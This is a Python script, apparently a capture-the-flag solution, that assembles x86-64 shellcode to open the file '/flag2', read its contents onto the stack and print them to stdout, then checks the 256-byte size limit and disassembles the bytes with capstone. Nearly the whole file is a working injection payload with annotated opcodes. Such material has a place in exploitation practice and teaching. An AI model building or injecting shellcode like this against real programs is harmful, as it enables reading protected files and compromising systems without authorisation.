import struct
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

# "/flag2" + null, 8 bytes, push as imm64
s = b"/flag2\x00\x00"
imm = struct.unpack("<Q", s)[0]
print("imm =", hex(imm))

sc = b""
sc += b"\x48\xb8" + struct.pack("<Q", imm)   # movabs rax, imm("/flag2\0")
sc += b"\x50"                                 # push rax
sc += b"\x48\x89\xe7"                         # mov rdi, rsp
sc += b"\x31\xf6"                             # xor esi, esi   (O_RDONLY)
sc += b"\x31\xd2"                             # xor edx, edx   (mode)
sc += b"\xb8\x02\x00\x00\x00"                 # mov eax, 2     (open)
sc += b"\x0f\x05"                             # syscall
sc += b"\x48\x89\xc7"                         # mov rdi, rax   (fd)
sc += b"\x48\x8d\xb4\x24\x00\xfe\xff\xff"     # lea rsi, [rsp-0x200]  (stack buffer)
sc += b"\xba\x00\x02\x00\x00"                 # mov edx, 0x200 (count)
sc += b"\x31\xc0"                             # xor eax, eax   (read=0)
sc += b"\x0f\x05"                             # syscall
sc += b"\x48\x89\xc2"                         # mov rdx, rax   (count = bytes read)
sc += b"\x48\x8d\xb4\x24\x00\xfe\xff\xff"     # lea rsi, [rsp-0x200]
sc += b"\xbf\x01\x00\x00\x00"                 # mov edi, 1     (stdout)
sc += b"\xb8\x01\x00\x00\x00"                 # mov eax, 1     (write)
sc += b"\x0f\x05"                             # syscall
sc += b"\x31\xff"                             # xor edi, edi
sc += b"\xb8\x3c\x00\x00\x00"                 # mov eax, 60    (exit)
sc += b"\x0f\x05"                             # syscall

print("len =", len(sc), "(must be <= 256)")
md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(sc, 0x14000):
    print(f"  0x{i.address:x}: {i.mnemonic} {i.op_str}")
